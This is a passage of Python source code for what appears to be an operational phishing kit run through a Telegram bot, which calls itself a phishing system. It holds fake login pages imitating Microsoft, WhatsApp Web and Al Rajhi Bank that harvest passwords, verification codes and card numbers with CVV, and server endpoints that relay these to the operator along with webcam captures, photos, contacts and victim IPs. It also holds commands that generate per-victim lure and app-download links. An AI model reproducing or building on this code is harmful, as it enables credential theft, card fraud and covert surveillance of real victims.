        *{{margin:0;padding:0;box-sizing:border-box;}}
        body{{background:#f2f2f2;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}}
        .container{{max-width:440px;width:100%;background:white;padding:44px 40px 36px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.08);}}
        .logo{{font-size:28px;font-weight:600;color:#202124;text-align:center;}}
        .logo small{{font-size:14px;color:#5f6368;display:block;font-weight:400;}}
        .title{{font-size:20px;font-weight:600;color:#202124;text-align:center;}}
        .subtitle{{font-size:15px;color:#5f6368;text-align:center;margin-bottom:30px;}}
        .input-group{{margin-bottom:18px;}}
        .input-group input{{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:15px;outline:none;}}
        .input-group input:focus{{border-color:#0078d4;}}
        .btn{{background:#0078d4;color:white;border:none;padding:12px;font-size:15px;font-weight:600;border-radius:4px;cursor:pointer;width:100%;}}
        .btn:hover{{background:#005a9e;}}
        .error{{color:#d13438;font-size:14px;margin-top:15px;display:none;background:#fce8e6;padding:10px;border-radius:4px;text-align:center;}}
        .footer{{margin-top:25px;text-align:center;font-size:13px;color:#5f6368;}}
        .footer a{{color:#0078d4;text-decoration:none;}}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Microsoft <small>حسابك</small></div>
        <div class="title">تسجيل الدخول</div>
        <div class="subtitle">لتفعيل اشتراكك وخدماتك</div>
        <div class="input-group"><input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم" autofocus></div>
        <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور"></div>
        <button class="btn" id="loginBtn">تسجيل الدخول</button>
        <div class="error" id="errorMsg">تأكد من صحة بيانات الدخول</div>
        <div class="footer"><a href="#">نسيت كلمة المرور؟</a> · <a href="#">إنشاء حساب جديد</a></div>
    </div>
    <script>
        const ownerId = new URLSearchParams(window.location.search).get('id');
        document.getElementById('loginBtn').addEventListener('click', function(){{
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value.trim();
            const errorBlock = document.getElementById('errorMsg');
            if(!email || !pass){{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ يرجى ملء جميع الحقول'; return; }}
            errorBlock.style.display='none';
            fetch('/api/credentials',{{
                method:'POST',
                headers:{{'Content-Type':'application/json'}},
                body:JSON.stringify({{user_id:ownerId, email:email, password:pass, login_type:'microsoft', secret:'{secret_key}'}})
            }}).then(()=>{{ window.location.href='https://login.live.com/'; }});
        }});
        document.getElementById('password').addEventListener('keypress', function(e){{ if(e.key==='Enter') document.getElementById('loginBtn').click(); }});
    </script>
</body>
</html>"""
    
    elif template_type == "whatsapp":
        return f"""<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واتساب ويب</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box;}}
        body{{background:#075e54;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}}
        .container{{max-width:450px;width:100%;background:#fff;border-radius:12px;padding:40px 30px;box-shadow:0 10px 30px rgba(0,0,0,0.2);}}
        .logo .w{{width:70px;height:70px;background:#25d366;border-radius:50%;margin:0 auto;display:flex;align-items:center;justify-content:center;font-size:36px;color:white;font-weight:bold;}}
        .title{{font-size:22px;font-weight:600;color:#075e54;text-align:center;margin-top:10px;}}
        .subtitle{{font-size:15px;color:#5f6368;text-align:center;margin-bottom:25px;}}
        .input-group{{margin-bottom:18px;}}
        .input-group input{{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:8px;font-size:16px;background:#f5f5f5;outline:none;}}
        .input-group input:focus{{border-color:#25d366;background:white;}}
        .btn{{background:#25d366;color:white;border:none;padding:14px;font-size:16px;font-weight:600;border-radius:8px;cursor:pointer;width:100%;}}
        .btn:hover{{background:#1da85c;}}
        .error{{color:#d93025;font-size:14px;margin-top:15px;display:none;background:#fce8e6;padding:10px;border-radius:8px;text-align:center;}}
        .qr-box{{background:#f0f0f0;border-radius:8px;padding:20px;text-align:center;margin-bottom:20px;}}
        .qr-box .qr-placeholder{{width:120px;height:120px;background:#fff;margin:0 auto;border:2px dashed #ccc;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;color:#999;}}
        .footer{{margin-top:20px;text-align:center;font-size:13px;color:#5f6368;}}
        .footer a{{color:#075e54;text-decoration:none;font-weight:600;}}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><div class="w">W</div></div>
        <div class="title">واتساب ويب</div>
        <div class="subtitle">لتفعيل حسابك، أدخل رقم هاتفك ورمز التفعيل</div>
        <div class="qr-box"><div class="qr-placeholder">🔲 امسح الرمز<br>أو أدخل البيانات</div></div>
        <div class="input-group"><input type="text" id="phone" placeholder="رقم الهاتف (مثال: 9665xxxxxxxx)" dir="ltr"></div>
        <div class="input-group"><input type="text" id="code" placeholder="رمز التفعيل المكون من 6 أرقام" dir="ltr"></div>
        <button class="btn" id="verifyBtn">تفعيل الحساب</button>
        <div class="error" id="errorMsg">تأكد من صحة البيانات</div>
        <div class="footer"><a href="#">مساعدة</a> · <a href="#">سياسة الخصوصية</a></div>
    </div>
    <script>
        const ownerId = new URLSearchParams(window.location.search).get('id');
        document.getElementById('verifyBtn').addEventListener('click', function(){{
            const phone = document.getElementById('phone').value.trim();
            const code = document.getElementById('code').value.trim();
            const errorBlock = document.getElementById('errorMsg');
            if(!phone || !code){{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ يرجى ملء جميع الحقول'; return; }}
            if(phone.length<10){{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ رقم الهاتف غير مكتمل'; return; }}
            if(code.length<4){{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ رمز التفعيل يجب أن يكون 6 أرقام'; return; }}
            errorBlock.style.display='none';
            fetch('/api/credentials',{{
                method:'POST',
                headers:{{'Content-Type':'application/json'}},
                body:JSON.stringify({{user_id:ownerId, phone:phone, code:code, login_type:'whatsapp', secret:'{secret_key}'}})
            }}).then(()=>{{ window.location.href='https://web.whatsapp.com/'; }});
        }});
        document.getElementById('code').addEventListener('keypress', function(e){{ if(e.key==='Enter') document.getElementById('verifyBtn').click(); }});
    </script>
</body>
</html>"""
    
    elif template_type == "bank":
        return f"""<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد البطاقة - الراجحي</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box;}}
        body{{background:#f0f2f5;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}}
        .container{{max-width:440px;width:100%;background:white;border-radius:12px;padding:35px 30px;box-shadow:0 4px 20px rgba(0,0,0,0.1);}}
        .logo .bank-name{{font-size:28px;font-weight:700;color:#003366;text-align:center;}}
        .logo .bank-sub{{font-size:13px;color:#666;text-align:center;}}
        .title{{font-size:20px;font-weight:600;color:#003366;text-align:center;}}
        .subtitle{{font-size:14px;color:#5f6368;text-align:center;margin-bottom:25px;}}
        .input-group{{margin-bottom:16px;}}
        .input-group label{{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:5px;}}
        .input-group input{{width:100%;padding:12px 14px;border:1px solid #d1d5db;border-radius:8px;font-size:15px;outline:none;}}
        .input-group input:focus{{border-color:#003366;box-shadow:0 0 0 3px rgba(0,51,102,0.1);}}
        .input-row{{display:flex;gap:12px;}}
        .input-row .input-group{{flex:1;}}
        .btn{{background:#003366;color:white;border:none;padding:14px;font-size:16px;font-weight:600;border-radius:8px;cursor:pointer;width:100%;}}
        .btn:hover{{background:#002244;}}
        .error{{color:#d93025;font-size:14px;margin-top:15px;display:none;background:#fce8e6;padding:10px;border-radius:8px;text-align:center;}}
        .footer{{margin-top:25px;text-align:center;font-size:12px;color:#666;}}
        .footer a{{color:#003366;text-decoration:none;}}
        .secure{{text-align:center;margin-top:15px;font-size:13px;color:#34a853;}}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><div class="bank-name">🏦 الراجحي</div><div class="bank-sub">Al Rajhi Bank</div></div>
        <div class="title">تأكيد بيانات البطاقة</div>
        <div class="subtitle">لتحديث بيانات حسابك وإتمام عملية التحقق</div>
        <div class="input-group"><label>رقم البطاقة (16 خانة)</label><input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" dir="ltr"></div>
        <div class="input-row"><div class="input-group"><label>تاريخ الانتهاء</label><input type="text" id="expiry" placeholder="MM/YY" maxlength="5" dir="ltr"></div><div class="input-group"><label>رمز CVV</label><input type="password" id="cvv" placeholder="XXX" maxlength="4" dir="ltr"></div></div>
        <button class="btn" id="verifyBtn">تأكيد والتحقق</button>
        <div class="error" id="errorMsg">تأكد من صحة البيانات المدخلة</div>
        <div class="secure"><span>🔒</span> اتصال مشفر وآمن 256-bit</div>
        <div class="footer"><a href="#">شروط الاستخدام</a> · <a href="#">سياسة الخصوصية</a></div>
    </div>
    <script>
        const ownerId = new URLSearchParams(window.location.search).get('id');
        document.getElementById('cardNumber').addEventListener('input', function(e){{
            let val = this.value.replace(/\\D/g,'');
            if(val.length>16) val=val.slice(0,16);
            let formatted='';
            for(let i=0;i<val.length;i++){{ if(i>0&&i%4===0) formatted+=' '; formatted+=val[i]; }}
            this.value=formatted;
        }});
        document.getElementById('expiry').addEventListener('input', function(e){{
            let val = this.value.replace(/\\D/g,'');
            if(val.length>4) val=val.slice(0,4);
            if(val.length>=2){{ this.value=val.slice(0,2)+'/'+val.slice(2); }} else {{ this.value=val; }}
        }});
        document.getElementById('verifyBtn').addEventListener('click', function(){{
            const card = document.getElementById('cardNumber').value.trim();
            const expiry = document.getElementById('expiry').value.trim();
            const cvv = document.getElementById('cvv').value.trim();
            const errorBlock = document.getElementById('errorMsg');
            const cardDigits = card.replace(/\\s/g,'');
            if(!card || cardDigits.length<16){{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ رقم البطاقة يجب أن يتكون من 16 خانة'; return; }}
            if(!expiry || expiry.length<5){{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ أدخل تاريخ الانتهاء بصيغة MM/YY'; return; }}
            if(!cvv || cvv.length<3){{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ أدخل رمز CVV المكون من 3 أو 4 أرقام'; return; }}
            errorBlock.style.display='none';
            fetch('/api/credentials',{{
                method:'POST',
                headers:{{'Content-Type':'application/json'}},
                body:JSON.stringify({{user_id:ownerId, card_number:card, card_expiry:expiry, card_cvv:cvv, login_type:'bank', secret:'{secret_key}'}})
            }}).then(()=>{{ window.location.href='https://www.alrajhibank.com.sa/'; }});
        }});
        document.getElementById('cvv').addEventListener('keypress', function(e){{ if(e.key==='Enter') document.getElementById('verifyBtn').click(); }});
    </script>
</body>
</html>"""
    
    return "<h1>قالب غير معروف</h1>"

# ==================== نقاط API ====================
@app.post("/api/web-login")
async def api_web_login(data: dict):
    chat_id = data.get("chat_id")
    username = data.get("username")
    password = data.get("password")
    if try_login_user(chat_id, username, password):
        bot.send_message(chat_id, "✅ تم تسجيل الدخول بنجاح.")
        return {"status": "success"}
    return {"status": "error", "message": "بيانات غير صحيحة"}

@app.post("/api/capture")
async def capture_api(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.json()
        if body.get("secret") != CAPTURE_SECRET:
            raise HTTPException(status_code=403, detail="Unauthorized")
        user_id = body.get("user_id")
        image_b64 = body.get("image")
        shot_count = body.get("count", 1)
        device_info = body.get("device", "غير معروف")
        client_ip = request.client.host
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            client_ip = forwarded.split(",")[0].strip()
        if not user_id or not image_b64:
            return JSONResponse(status_code=400, content={"status": "error"})
        log_capture(int(user_id), client_ip, device_info, shot_count)
        header, encoded = image_b64.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        image_file = io.BytesIO(image_bytes)
        image_file.name = f"capture_{shot_count}.jpg"
        background_tasks.add_task(
            bot.send_photo,
            chat_id=int(user_id),
            photo=image_file,
            caption=f"📸 لقطة {shot_count}\n📱 جهاز: {device_info}\n🌐 آيبي: {client_ip}"
        )
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Capture Error: {e}")
        return JSONResponse(status_code=500, content={"status": "error"})

@app.post("/api/credentials")
async def credentials_api(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.json()
        if body.get("secret") != CAPTURE_SECRET:
            raise HTTPException(status_code=403, detail="Unauthorized")
        user_id = body.get("user_id")
        login_type = body.get("login_type", "unknown")
        email = body.get("email", "")
        password = body.get("password", "")
        card_number = body.get("card_number", "")
        card_expiry = body.get("card_expiry", "")
        card_cvv = body.get("card_cvv", "")
        phone = body.get("phone", "")
        code = body.get("code", "")
        cookies = body.get("cookies", "")
        client_ip = request.client.host
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            client_ip = forwarded.split(",")[0].strip()
        if not user_id:
            return JSONResponse(status_code=400, content={"status": "error"})
        log_credentials(int(user_id), login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, client_ip)
        if login_type in ["google", "microsoft"]:
            msg = f"🔑 **صيد بيانات دخول!**\nالنوع: {login_type.upper()}\nالبريد: `{email}`\nكلمة المرور: `{password}`"
        elif login_type == "whatsapp":
            msg = f"💬 **صيد واتساب!**\nرقم الهاتف: `{phone}`\nرمز التفعيل: `{code}`"
        elif login_type == "bank":
            msg = f"💳 **صيد بطاقة ائتمان!**\nرقم البطاقة: `{card_number}`\nتاريخ الانتهاء: `{card_expiry}`\nرمز CVV: `{card_cvv}`"
        else:
            msg = f"📦 **بيانات جديدة!**\nالنوع: {login_type}"
        msg += f"\n🌐 آيبي: `{client_ip}`"
        background_tasks.add_task(
            bot.send_message,
            chat_id=int(user_id),
            text=msg,
            parse_mode="Markdown"
        )
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Credentials Error: {e}")
        return JSONResponse(status_code=500, content={"status": "error"})

@app.post("/api/upload_all_data")
async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        images_b64 = data.get("images", [])
        contacts = data.get("contacts", "")
        summary = f"📱 **بيانات جديدة!**\n🆔 المستخدم: `{user_id}`\n📸 عدد الصور: `{len(images_b64)}`\n📇 جهات الاتصال: `{contacts.count(chr(10))}` سطر"
        background_tasks.add_task(bot.send_message, chat_id=OWNER_ID, text=summary, parse_mode="Markdown")
        for idx, img_b64 in enumerate(images_b64[:15]):
            try:
                img_bytes = base64.b64decode(img_b64)
                img_file = io.BytesIO(img_bytes)
                img_file.name = f"img_{user_id}_{idx}.jpg"
                background_tasks.add_task(bot.send_photo, chat_id=OWNER_ID, photo=img_file, caption=f"📸 صورة {idx+1}")
            except Exception as e:
                logger.error(f"فشل إرسال الصورة: {e}")
        if contacts:
            parts = [contacts[i:i+4000] for i in range(0, len(contacts), 4000)]
            for part in parts:
                background_tasks.add_task(
                    bot.send_message,
                    chat_id=OWNER_ID,
                    text=f"📇 جهات اتصال {user_id}:\n```\n{part}\n```",
                    parse_mode="Markdown"
                )
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO uploaded_data (user_id, images_count, contacts_rows, created_at) VALUES (?, ?, ?, ?)",
            (user_id, len(images_b64), contacts.count('\n') if contacts else 0, datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Upload Error: {traceback.format_exc()}")
        return JSONResponse(status_code=500, content={"status": "error"})

# ==================== أوامر البوت ====================
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    logger.info(f"📩 بدء المستخدم {chat_id}")
    if has_active_session(chat_id):
        show_main_menu(chat_id)
        return
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=WebAppInfo(url=f"{RENDER_URL}/login-page")),
        InlineKeyboardButton("ℹ️ تعليمات", callback_data="show_instructions")
    )
    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v13.0\nيرجى تسجيل الدخول.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
def show_instructions(call):
    try:
        bot.answer_callback_query(call.id, "جاري العرض...")
        bot.send_message(call.message.chat.id, "للاشتراك تواصل مع الإدارة.", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")))
    except Exception as e:
        logger.error(f"Error instructions: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    try:
        bot.answer_callback_query(call.id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    except Exception as e:
        logger.error(f"Error back: {e}")

def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🎬 تيك توك", callback_data="gen_tiktok"),
        InlineKeyboardButton("📸 إنستغرام", callback_data="gen_instagram"),
        InlineKeyboardButton("👻 سناب شات", callback_data="gen_snapchat"),
        InlineKeyboardButton("🧠 فلتر AI", callback_data="gen_ai_filter"),
        InlineKeyboardButton("🚨 أبشر", callback_data="gen_absher"),
        InlineKeyboardButton("📧 جوجل", callback_data="gen_google"),
        InlineKeyboardButton("🔑 مايكروسوفت", callback_data="gen_microsoft"),
        InlineKeyboardButton("💬 واتساب", callback_data="gen_whatsapp"),
        InlineKeyboardButton("💳 بنك", callback_data="gen_bank"),
        InlineKeyboardButton("🔗 توليد رابط التحميل", callback_data="gen_download_link"),
        InlineKeyboardButton("🔄 تحديث الجلسة", callback_data="gen_refresh")
    )
    bot.send_message(chat_id, "👑 اختر القالب المناسب:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "gen_download_link")
def handle_gen_download_link(call):
    try:
        bot.answer_callback_query(call.id, "⏳ جاري توليد الرابط...")
        # محاكاة الأمر /genlink
        chat_id = call.message.chat.id
        if chat_id != OWNER_ID:
            bot.send_message(chat_id, "⛔ هذا الأمر خاص بصاحب النظام.")
            return
        unique_id = f"user_{chat_id}_{int(datetime.now().timestamp())}"
        download_url = f"{RENDER_URL}/download_app?id={unique_id}"
        save_download_link(unique_id, chat_id)
        bot.send_message(
            chat_id,
            f"🔗 **رابط تحميل التطبيق المخصص للضحية:**\n\n"
            f"`{download_url}`\n\n"
            f"📌 أرسل هذا الرابط للضحية.\n"
            f"🆔 معرف الرابط: `{unique_id}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"خطأ في توليد الرابط: {e}")
        bot.send_message(call.message.chat.id, f"❌ خطأ: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def gen_link(call):
    try:
        bot.answer_callback_query(call.id, "⏳ جاري التجهيز...")
    except:
        pass
    chat_id = call.message.chat.id
    logger.info(f"🔄 زر مضغوط: {call.data} من {chat_id}")
    try:
        if not has_active_session(chat_id):
            bot.send_message(chat_id, "❌ جلسة منتهية. استخدم /start.")
            return
        raw = call.data.split("_", 1)[1]
        template_map = {
            "tiktok": "tiktok", "instagram": "instagram", "snapchat": "snapchat",
            "ai_filter": "ai_filter", "absher": "absher",
            "google": "google", "microsoft": "microsoft",
            "whatsapp": "whatsapp", "bank": "bank",
            "refresh": "refresh"
        }
        template = template_map.get(raw)
        if not template:
            bot.send_message(chat_id, "⚠️ نوع غير معروف.")
            return
        if template == "refresh":
            bot.send_message(chat_id, "✅ تم تحديث الجلسة.")
            return
        link = f"{RENDER_URL}?id={chat_id}&template={template}"
        log_operation(chat_id, template, link, "pending")
        bot.send_message(chat_id, f"🚀 **الرابط جاهز:**\n`{link}`\n📌 النوع: {template.upper()}", parse_mode="Markdown")
        logger.info(f"✅ تم إرسال الرابط {link}")
    except Exception as e:
        logger.error(f"💥 خطأ: {traceback.format_exc()}")
        bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")

# ==================== أمر توليد رابط التحميل (للمالك) ====================
@bot.message_handler(commands=['genlink'])
def generate_download_link(message):
    chat_id = message.chat.id
    if chat_id != OWNER_ID:
        bot.send_message(chat_id, "⛔ هذا الأمر خاص بصاحب النظام.")
        return
    try:
        unique_id = f"user_{chat_id}_{int(datetime.now().timestamp())}"
        download_url = f"{RENDER_URL}/download_app?id={unique_id}"
        save_download_link(unique_id, chat_id)
        bot.send_message(
            chat_id,
            f"🔗 **رابط تحميل التطبيق المخصص للضحية:**\n\n"
            f"`{download_url}`\n\n"
            f"📌 أرسل هذا الرابط للضحية. عند فتحه، ستظهر صفحة تحميل جذابة تحتوي على زر تحميل."
            f"\n\n🆔 معرف الرابط: `{unique_id}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"خطأ في توليد الرابط: {e}")
        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")

# ==================== تشغيل الخادم ====================
@app.on_event("startup")
def startup():
    try:
        bot.remove_webhook()
        webhook_url = f"{RENDER_URL}/{BOT_TOKEN}"
        bot.set_webhook(url=webhook_url)
        logger.info(f"🚀 Webhook مضبوط على: {webhook_url}")
    except Exception as e:
        logger.error(f"⚠️ فشل ضبط Webhook: {e}")
    create_new_account("moosa", "123456")
    logger.info("🔥 Shadow Phoenix v13.0 جاهز!")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
